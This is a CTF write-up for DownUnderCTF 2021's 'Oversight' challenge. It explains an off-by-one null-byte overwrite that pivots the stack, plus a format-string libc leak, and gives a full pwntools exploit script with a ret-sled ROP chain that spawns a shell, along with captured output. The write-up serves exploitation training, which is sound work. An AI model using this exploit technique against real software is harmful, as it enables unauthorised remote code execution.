# DownUnderCTF 2021

## Oversight

> 100
> 
> One tiny mistake and it's all over
>
> Author: B3NNY
>
> `nc pwn-2021.duc.tf 31909`
>
> [`oversight`](oversight) [`libc-2.27.so`](libc-2.27.so)

Tags: _pwn_ _x86-64_ _off-by-one_ _remote-shell_ _rop_ _stack-pivot_ _retsled_ _format-string_


## Summary

Off-by-one overwrite of preserved base pointer to pivot the stack to a retsled padded ROP chain to get a shell.

Bonus format-string exploit to get libc leak.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Partial RELRO = GOT overwrite; No canary = Easy BOF.


### Decompile with Ghidra   

```c
void echo_inner(void *param_1,int param_2)
{
  size_t sVar1;
  
  sVar1 = fread(param_1,1,(long)param_2,stdin);
  *(undefined *)((long)param_1 + (long)(int)sVar1) = 0;
  puts("You said:");
  printf("%s",param_1);
  return;
}
```

The principal bug is `*(undefined *)((long)param_1 + (long)(int)sVar1) = 0;`, where the _next byte_ is set to zero.  It is not uncommon to set the last byte to `\0` to terminate a string, e.g. `fgets(buf,20,stdin)` will read up to `19` bytes and then terminate with `\0`, however the above would read `20` bytes and then terminate the 21st byte with `\0`, hence _off-by-one_.

```
void echo(undefined4 param_1)
{
  undefined local_108 [256];
  
  echo_inner(local_108,param_1);
  return;
}
```

`echo` just before calling `echo_inner` stack:

```
0x00007fffffffe160│+0x0000: 0x00007ffff7fac8a0  →  0x0000000000000000	 ← $rsp, $rdi
0x00007fffffffe168│+0x0008: 0x00007ffff7e53d1f  →  <_IO_file_underflow+383> test rax, rax
0x00007fffffffe170│+0x0010: 0x0000000000000000
0x00007fffffffe178│+0x0018: 0x0000000000000000
0x00007fffffffe180│+0x0020: 0x00007fffffffe290  →  0x00007fffffffe2b0  →  0x00007fffffffe350  →  0x00007fffffffe360  →  0x0000000000000000
0x00007fffffffe188│+0x0028: 0x00007ffff7fab980  →  0x00000000fbad2288
0x00007fffffffe190│+0x0030: 0x00007ffff7fad4a0  →  0x0000000000000000
0x00007fffffffe198│+0x0038: 0x00007ffff7fab980  →  0x00000000fbad2288
0x00007fffffffe1a0│+0x0040: 0x00005555555592a3  →  0x000000000000000a
0x00007fffffffe1a8│+0x0048: 0x00007fffffffe27b  →  0xffe2d0000a363532 ("256\n"?)
0x00007fffffffe1b0│+0x0050: 0x0000000000000004
0x00007fffffffe1b8│+0x0058: 0x00007ffff7e55106  →  <_IO_default_uflow+54> cmp eax, 0xffffffff
0x00007fffffffe1c0│+0x0060: 0x0000000000000000
0x00007fffffffe1c8│+0x0068: 0x0000000000000000
0x00007fffffffe1d0│+0x0070: 0x000000000000000a
0x00007fffffffe1d8│+0x0078: 0x00007ffff7e46a64  →  <_IO_getline_info+292> mov rcx, QWORD PTR [rsp+0x8]
0x00007fffffffe1e0│+0x0080: 0x0000003000000008
0x00007fffffffe1e8│+0x0088: 0x00005555555592a4  →  0x0000000000000000
0x00007fffffffe1f0│+0x0090: 0x0000000100000001
0x00007fffffffe1f8│+0x0098: 0x0000000000000000
0x00007fffffffe200│+0x00a0: 0x0000000000000d68 ("h\r"?)
0x00007fffffffe208│+0x00a8: 0x00007ffff7fab980  →  0x00000000fbad2288
0x00007fffffffe210│+0x00b0: 0x0000000000000005
0x00007fffffffe218│+0x00b8: 0x0000000000000000
0x00007fffffffe220│+0x00c0: 0x0000000000050000
0x00007fffffffe228│+0x00c8: 0xffffffffffffffff
0x00007fffffffe230│+0x00d0: 0x0000000000000000
0x00007fffffffe238│+0x00d8: 0x0000555555555430  →  <__libc_csu_init+0> endbr64
0x00007fffffffe240│+0x00e0: 0x00007fffffffe290  →  0x00007fffffffe2b0  →  0x00007fffffffe350  →  0x00007fffffffe360  →  0x0000000000000000
0x00007fffffffe248│+0x00e8: 0x00007fffffffe27b  →  0xffe2d0000a363532 ("256\n"?)
0x00007fffffffe250│+0x00f0: 0x00007fffffffe450  →  0x0000000000000001
0x00007fffffffe258│+0x00f8: 0x0000000000000000
0x00007fffffffe260│+0x0100: 0x00007fffffffe290  →  0x00007fffffffe2b0  →  0x00007fffffffe350  →  0x00007fffffffe360  →  0x0000000000000000	 ← $rbp
```

There's a lot of garbage in here (uninitialized buffer), but just ignore that, just focus on the preserved base pointer (`0x00007fffffffe260`), its value is currently `0x00007fffffffe290`, this is what the stack pointer will be set to at the end of `echo`.

`echo` passes a pointer to `echo_inner`, if you examine the stack after sending 256 bytes (you need to send 256 bytes) you'll see the preserved (set in `echo`) base pointer LSB has been reset to `00`:

```
0x00007fffffffe140│+0x0000: 0x0000000000000000	 ← $rsp
0x00007fffffffe148│+0x0008: 0x00007fffffffe27b  →  0xffe2d0000a363532 ("256\n"?)
0x00007fffffffe150│+0x0010: 0x00007fffffffe260  →  0x00007fffffffe200  →  "AAAAAAAA" ← $rbp
0x00007fffffffe158│+0x0018: 0x00005555555552f9  →  <echo+25> leave
0x00007fffffffe160│+0x0020: "AAAAAAAA"
0x00007fffffffe168│+0x0028: "AAAAAAAA"
0x00007fffffffe170│+0x0030: "AAAAAAAA"
0x00007fffffffe178│+0x0038: "AAAAAAAA"
0x00007fffffffe180│+0x0040: "AAAAAAAA"
0x00007fffffffe188│+0x0048: "AAAAAAAA"
0x00007fffffffe190│+0x0050: "AAAAAAAA"
0x00007fffffffe198│+0x0058: "AAAAAAAA"
0x00007fffffffe1a0│+0x0060: "AAAAAAAA"
0x00007fffffffe1a8│+0x0068: "AAAAAAAA"
0x00007fffffffe1b0│+0x0070: "AAAAAAAA"
0x00007fffffffe1b8│+0x0078: "AAAAAAAA"
0x00007fffffffe1c0│+0x0080: "AAAAAAAA"
0x00007fffffffe1c8│+0x0088: "AAAAAAAA"
0x00007fffffffe1d0│+0x0090: "AAAAAAAA"
0x00007fffffffe1d8│+0x0098: "AAAAAAAA"
0x00007fffffffe1e0│+0x00a0: "AAAAAAAA"
0x00007fffffffe1e8│+0x00a8: "AAAAAAAA"
0x00007fffffffe1f0│+0x00b0: "AAAAAAAA"
0x00007fffffffe1f8│+0x00b8: "AAAAAAAA"
0x00007fffffffe200│+0x00c0: "AAAAAAAA"
0x00007fffffffe208│+0x00c8: "AAAAAAAA"
0x00007fffffffe210│+0x00d0: "AAAAAAAA"
0x00007fffffffe218│+0x00d8: "AAAAAAAA"
0x00007fffffffe220│+0x00e0: "AAAAAAAA"
0x00007fffffffe228│+0x00e8: "AAAAAAAA"
0x00007fffffffe230│+0x00f0: "AAAAAAAA"
0x00007fffffffe238│+0x00f8: "AAAAAAAA"
0x00007fffffffe240│+0x0100: "AAAAAAAA"
0x00007fffffffe248│+0x0108: "AAAAAAAA"
0x00007fffffffe250│+0x0110: "AAAAAAAA"
0x00007fffffffe258│+0x0118: "AAAAAAAA"
0x00007fffffffe260│+0x0120: 0x00007fffffffe200  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
```

`0x00007fffffffe290` is now `0x00007fffffffe200` and also pointing ~2/3rd down our buffer.  This will be our stack pivot to our ROP chain.

Before we get ahead of ourselves we need to leak libc if we want to call `system`, that is provided by:

```
__pid_t wait(void *__stat_loc)
{
  __pid_t _Var1;
  ulong uVar2;
  char local_8d [5];
  char local_88 [120];
  
  puts("Press enter to continue");
  getc(stdin);
  printf("Pick a number: ");
  fgets(local_8d,5,stdin);
  uVar2 = strtol(local_8d,(char **)0x0,10);
  snprintf(local_88,100,"Your magic number is: %%%d$llx\n",uVar2 & 0xffffffff);
  printf(local_88);
  _Var1 = introduce();
  return _Var1;
}
```

There's a format-string bug at `printf(local_88);`.  Parameter `27` has a leak to `__libc_start_main`.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./oversight')

while True:
    if args.REMOTE:
        p = remote('pwn-2021.duc.tf', 31909)
        libc = ELF('./libc-2.27.so')
        libc_start_main_offset = 231
    else:
        p = process(binary.path)
        libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
        libc_start_main_offset = 243

    try:
        p.sendline()
        p.sendlineafter(b'number: ',b'27')
        p.recvuntil(b'Your magic number is: ')
        libc.address = int(p.recvline().strip().decode(),16) - libc.sym.__libc_start_main - libc_start_main_offset
        log.info('libc.address: ' + hex(libc.address))

        pop_rdi = next(libc.search(asm('pop rdi; ret')))

        payload  = b''
        payload += ((256 - 32) // 8) * p64(pop_rdi+1) # ret sled
        payload += p64(pop_rdi)
        payload += p64(libc.search(b"/bin/sh").__next__())
        payload += p64(libc.sym.system)
        payload += (256 - len(payload)) * b'B'

        p.sendlineafter(b'(max 256)?',b'256')
        p.send(payload)
        p.recvuntil(p64(pop_rdi+1)[:6],timeout=0.5)
        p.sendline(b'echo shell')
        if b'shell' in p.recvline(timeout=1):
            p.interactive()
            break
    except:
        continue
```

ASLR will pivot the stack in most cases into a random place in our buffer (however it will be stack aligned (ending in `00`)), so we'll want a loop to check for crashes, timeouts, or a shell.

Within the `try:` block we'll first leak libc after being prompted for a `number:`.  This is a freebee.

Next we'll create our ROP chain; padding it with a retsled.  This will give us a better chance of getting a shell on the first try.

> Below is the longest example I could capture with multiple attempts before getting a shell.  Mostly I got a shell on the first attempt.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/downunderctf2021/oversight/oversight'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to pwn-2021.duc.tf on port 31909: Done
[*] '/pwd/datajerk/downunderctf2021/oversight/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] libc.address: 0x7fe8da9f5000
[+] Opening connection to pwn-2021.duc.tf on port 31909: Done
[*] libc.address: 0x7f076b693000
[+] Opening connection to pwn-2021.duc.tf on port 31909: Done
[*] libc.address: 0x7fcfe9191000
[*] Switching to interactive mode
$ cat flag.txt
DUCTF{1_sm@LL_0ver5ight=0v3rFLOW}
```
